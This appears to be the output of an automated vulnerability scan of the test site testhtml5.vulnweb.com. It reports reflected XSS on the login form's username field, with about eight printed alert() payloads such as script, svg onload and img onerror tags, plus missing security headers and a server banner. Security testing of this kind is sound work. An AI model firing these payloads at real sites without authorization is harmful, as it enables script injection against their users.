
--------------------------------------------------
Starting Web Vulnerability Scan for: http://testhtml5.vulnweb.com
Rate Limit Delay: 0.1 seconds per request
--------------------------------------------------


[+] Running Information Gathering for: http://testhtml5.vulnweb.com

[+] Running XSS Scan for: http://testhtml5.vulnweb.com

[+] Running SQL Injection Scan for: http://testhtml5.vulnweb.com

[+] Running Security Misconfiguration Scan for: http://testhtml5.vulnweb.com

Scan finished.

[!!!!] Found 12 potential issues or information disclosures. [!!!!]

=== Scan Report ===

=== Finding 1 ===
Type: Reflected XSS (POST)
Severity: High
Description: Potential Reflected XSS found. Payload '';alert(1)//' reflected as plain text in POST parameter 'username'.
URL: http://testhtml5.vulnweb.com/login
Evidence:
Form Action: http://testhtml5.vulnweb.com/login
Parameter: username
Payload: ';alert(1)//
Reflected in body.
==============================

=== Finding 2 ===
Type: Security Header Missing
Severity: Medium
Description: X-Frame-Options header not found. Site may be vulnerable to Clickjacking.
URL: http://testhtml5.vulnweb.com
Evidence:
Missing X-Frame-Options header.
==============================

=== Finding 3 ===
Type: Reflected XSS (POST - Possible)
Severity: Medium
Description: XSS payload '<script>alert('XSS')</script>' reflected in response for POST parameter 'username', but context uncertain. Manual review recommended.
URL: http://testhtml5.vulnweb.com/login
Evidence:
Form Action: http://testhtml5.vulnweb.com/login
Parameter: username
Payload: <script>alert('XSS')</script>
Raw reflection detected.
==============================

=== Finding 4 ===
Type: Reflected XSS (POST - Possible)
Severity: Medium
Description: XSS payload '<svg onload=alert('XSS')>' reflected in response for POST parameter 'username', but context uncertain. Manual review recommended.
URL: http://testhtml5.vulnweb.com/login
Evidence:
Form Action: http://testhtml5.vulnweb.com/login
Parameter: username
Payload: <svg onload=alert('XSS')>
Raw reflection detected.
==============================

=== Finding 5 ===
Type: Reflected XSS (POST - Possible)
Severity: Medium
Description: XSS payload '"><script>alert('XSS')</script>' reflected in response for POST parameter 'username', but context uncertain. Manual review recommended.
URL: http://testhtml5.vulnweb.com/login
Evidence:
Form Action: http://testhtml5.vulnweb.com/login
Parameter: username
Payload: "><script>alert('XSS')</script>
Raw reflection detected.
==============================

=== Finding 6 ===
Type: Reflected XSS (POST - Possible)
Severity: Medium
Description: XSS payload '<iframe srcdoc="<script>alert('XSS')</script>">' reflected in response for POST parameter 'username', but context uncertain. Manual review recommended.
URL: http://testhtml5.vulnweb.com/login
Evidence:
Form Action: http://testhtml5.vulnweb.com/login
Parameter: username
Payload: <iframe srcdoc="<script>alert('XSS')</script>">
Raw reflection detected.
==============================

=== Finding 7 ===
Type: Reflected XSS (POST - Possible)
Severity: Medium
Description: XSS payload '<body onload=alert('XSS')>' reflected in response for POST parameter 'username', but context uncertain. Manual review recommended.
URL: http://testhtml5.vulnweb.com/login
Evidence:
Form Action: http://testhtml5.vulnweb.com/login
Parameter: username
Payload: <body onload=alert('XSS')>
Raw reflection detected.
==============================

=== Finding 8 ===
Type: Reflected XSS (POST - Possible)
Severity: Medium
Description: XSS payload ''><img src=x onerror=alert('XSS')>' reflected in response for POST parameter 'username', but context uncertain. Manual review recommended.
URL: http://testhtml5.vulnweb.com/login
Evidence:
Form Action: http://testhtml5.vulnweb.com/login
Parameter: username
Payload: '><img src=x onerror=alert('XSS')>
Raw reflection detected.
==============================

=== Finding 9 ===
Type: Reflected XSS (POST - Possible)
Severity: Medium
Description: XSS payload '<img src=x onerror=alert('XSS') style=display:none>' reflected in response for POST parameter 'username', but context uncertain. Manual review recommended.
URL: http://testhtml5.vulnweb.com/login
Evidence:
Form Action: http://testhtml5.vulnweb.com/login
Parameter: username
Payload: <img src=x onerror=alert('XSS') style=display:none>
Raw reflection detected.
==============================

=== Finding 10 ===
Type: Security Header Missing
Severity: Low
Description: Content-Security-Policy (CSP) header not found. This can increase XSS risk.
URL: http://testhtml5.vulnweb.com
Evidence:
Missing CSP header.
==============================

=== Finding 11 ===
Type: Connectivity
Severity: Informational
Description: Target URL is reachable and returned HTTP 200 OK.
URL: http://testhtml5.vulnweb.com
Evidence:
HTTP Status: 200
==============================

=== Finding 12 ===
Type: Information Disclosure
Severity: Informational
Description: Server banner disclosed: nginx/1.19.0
URL: http://testhtml5.vulnweb.com
Evidence:
Header: Server: nginx/1.19.0
==============================
=== End Report ===
